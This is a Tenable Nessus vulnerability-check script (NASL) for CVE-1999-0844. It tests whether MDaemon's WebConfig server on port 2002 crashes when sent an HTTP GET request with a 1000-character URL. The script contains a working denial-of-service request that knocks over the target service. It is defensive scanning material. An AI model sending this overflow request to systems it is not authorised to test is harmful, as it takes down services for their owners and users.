#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10138);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-1999-0844");
 script_bugtraq_id(820);
 script_xref(name:"OSVDB", value:"12034");

 script_name(english:"MDaemon WebConfig HTTP Server URL Overflow DoS");
 script_summary(english:"Crashes the remote service");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote web server has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to crash Webconfig (which is used to configure\n",
     "MDaemon) by sending the request :\n\n",
     "  GET /aaaaa[...]aaa HTTP/1.0\n\n",
     "This could allow a remote attacker to crash the webserver, preventing\n",
     "the MDaemon server from being configured remotely."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q4/0102.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "httpver.nasl");
 script_require_ports(2002);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 2002;
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 
 soc = http_open_socket(port);
 if(soc)
 {
  data = http_get(item:crap(1000), port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_warning(port);
 }
}
